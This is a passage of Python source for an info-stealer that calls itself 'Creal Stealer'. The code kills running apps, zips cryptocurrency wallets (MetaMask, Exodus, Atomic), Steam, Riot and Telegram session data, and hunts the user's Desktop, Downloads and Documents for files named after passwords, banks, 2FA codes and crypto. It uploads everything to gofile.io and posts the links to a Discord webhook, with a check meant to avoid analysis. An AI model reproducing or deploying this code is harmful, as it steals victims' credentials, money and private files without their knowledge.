                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 000000,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
        "attachments": []
    }
    urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
